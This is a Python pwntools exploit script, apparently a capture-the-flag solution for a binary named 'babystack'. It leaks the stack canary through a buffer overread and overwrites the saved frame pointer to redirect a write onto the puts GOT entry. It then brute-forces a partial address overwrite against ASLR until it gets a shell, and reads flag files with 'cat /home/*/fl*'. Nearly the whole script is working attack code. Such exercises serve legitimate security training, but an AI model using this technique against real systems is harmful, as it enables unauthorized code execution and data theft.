#!/usr/bin/python3
from pwn import *
context.log_level='debug'
#context.terminal = ["terminator", "-e"]
context.terminal = ["tmux", "splitw", "-h"]
#context.terminal = ['terminator', '--tew-tab', '-x']

import time
import struct
elf = context.binary = ELF("babystack")
libc = elf.libc
# =============================================================================
gs = '''
continue
'''
# =============================================================================
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

exp=""
i=0
# =============================================================================
while True:
    try:
        io = process(elf.path)
    #io=remote("172.19.0.2", 10102):
        i=i+1
        io.sendafter("Name: \n", "A"*0x10)
        io.sendafter("token: \n","B"*0x10)
        io.sendafter("str1: \n", "C"*8+'D')
        io.recvuntil("C"*8+'D')
        leak=io.recvuntil('\n',drop=True)
    #leak_rbp=str(hex(rbp))
        stack_cookie = u64(b"\x00" + leak[:7])
        #for i in leak:
        #    try:
        #        print(i.decode())
        #    except:
        #        print('no decode',hex(i))
        log.success("*"*20+" INTENTO: "+str(i)+" "+"*"*20)
        log.success("Leak cookie: %#x" % stack_cookie)
        io.sendafter("str2: \n", 'E'*0x22)

# --- SOBRESCRIBIR EBP PARA SOBRESCRIBIR GOT PUTS
        io.sendafter("str1: \n", b"\x00" + b"F"*(0x10-1))
        payload = b""
        payload += b"G" * 0x28
        payload += p64(stack_cookie)
        payload += p64(elf.got.puts-0x8+0x50)
        log.success("PUTS: %#x " % elf.got.puts)
        io.sendafter("str2: \n", payload)
    #io.send(p64(0xe2386
        try:
            io.send(b"\x00"*8 + b"\xce\x21\x0e")
    # Below is for w/o ASLR for local testing
    # io.send(b"\x00"*8 + b"\x04\xcf\x43")

            sleep(0.5)
    #try:
            io.sendline("echo itworked")
        #while True:
            line = io.recvline().decode()
            if "itworked" in line:
                log.success("Got a shell!")
                io.sendline("cat /home/*/fl*")
                io.interactive()
            else:
                print("error")
        except:
            print("error")
    except:
        print("error")
# leak_2=bytearray(leak_2)[-7:-1]
# leak_2=bytearray([leak_2[0],leak_2[1],leak_2[2],leak_2[3],leak_2[4],leak_2[5]])
# leak_2=u64(leak_2+b'\x00'+b'\x00')
# log.info(hex(leak_2))
# # io.send(b'D'*8+p64(int(leak_canary,16))+b'E'*32+p64(int(leak_canary,16))+p64(int(leak_canary,16)))
# strleak=""
##io.interactive()
